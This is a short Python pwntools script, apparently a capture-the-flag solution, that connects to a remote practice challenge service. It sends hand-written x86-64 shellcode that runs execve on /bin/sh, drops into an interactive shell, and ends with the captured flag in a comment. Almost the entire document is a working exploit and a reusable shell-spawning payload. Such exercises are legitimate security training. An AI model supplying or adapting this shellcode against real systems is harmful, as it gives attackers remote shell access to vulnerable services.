from pwn import *

def main():
    ### context ###
    context.arch = 'amd64'  # Ensure 64-bit architecture

    ### run ###
    #p = process("./shellcode")
    p = remote("pwnable.co.il", 9001)

    ### payload start ###
    shellcode = """
    jmp code

    shell:
        .ascii "/bin/sh\\x00"     

    code:
        xor rsi, rsi          
        xor rdx, rdx             
        lea rdi, [rip+shell]     
        mov al, 0x3b             
        syscall               
    """

    payload = asm(shellcode)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()

#flag: PWNIL{Good_thing_we_have_the_fs_register!}
